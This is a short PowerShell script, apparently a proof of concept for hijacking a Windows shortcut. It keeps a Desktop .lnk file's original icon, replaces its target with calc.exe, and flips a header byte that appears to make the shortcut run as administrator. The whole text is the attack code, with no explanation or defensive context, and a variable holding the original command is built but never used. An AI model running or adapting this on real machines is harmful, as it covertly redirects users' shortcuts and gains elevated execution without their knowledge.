$shell = New-Object -ComObject WScript.Shell
$destination = "C:\Users\grant\Desktop\OurShortcut.lnk"
$shortcut = $shell.CreateShortcut($destination)
$shortcut.IconLocation = $shortcut.TargetPath + $shortcut.IconLocation
$originalcmd = $shortcut.TargetPath + " " + $shortcut.Arguments
$shortcut.TargetPath = "calc.exe"
$shortcut.Save()
$bytes = [System.IO.File]::ReadAllBytes($destination)
$bytes[0x15] = $bytes[0x15] -bor 0x20 #set byte 21 (0x15) bit 6 (0x20) ON
[System.IO.File]::WriteAllBytes($destination, $bytes)
